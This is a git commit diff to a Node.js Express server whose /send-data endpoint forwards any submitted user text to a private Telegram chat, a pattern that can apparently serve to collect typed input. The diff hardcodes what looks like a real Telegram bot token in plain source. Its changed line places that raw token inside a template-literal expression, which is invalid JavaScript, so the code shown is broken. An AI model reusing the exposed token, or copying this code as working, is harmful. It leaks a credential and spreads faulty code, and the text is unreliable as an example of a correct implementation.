72007f308744d2c89b464f84c6e58579c009a9e2
James230kk <mohmeedlaptop@outlook.com>
2025-12-06 16:48:54 +0300

    Initial commit

--- server.js
+++ server.js
@@ -6,12 +6,12 @@ const app = express();
 app.use(bodyParser.json());
 
 const TELEGRAM_TOKEN = '8556980478:AAHadxPNtr0xh6Lt7phWLtxJuPi57kA6E4k';
-const CHAT_ID = '8556980478';
+const CHAT_ID = '7782836076';
 
 app.post('/send-data', async (req, res) => {
   const userText = req.body.text;
 
-  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+  await axios.post(`https://api.telegram.org/bot${8556980478:AAHadxPNtr0xh6Lt7phWLtxJuPi57kA6E4k}/sendMessage`, {
     chat_id: CHAT_ID,
     text: `User typed: ${userText}`
   });
